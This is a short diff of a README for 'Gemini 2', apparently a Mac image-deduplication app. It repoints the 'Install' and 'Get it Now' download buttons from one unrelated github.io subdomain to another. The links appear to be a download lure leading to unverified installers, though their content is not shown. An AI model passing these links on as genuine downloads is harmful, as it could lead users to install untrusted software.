@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/gemini2)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/gemini2)
 
 </div>
 
@@ -81,7 +81,7 @@ Gemini 2's similar image detection is its most technically significant capabilit
 
 <p align="center">
 
-[![Get it Now Gemini 2](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/gemini2)
+[![Get it Now Gemini 2](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/gemini2)
 
 </p>
 
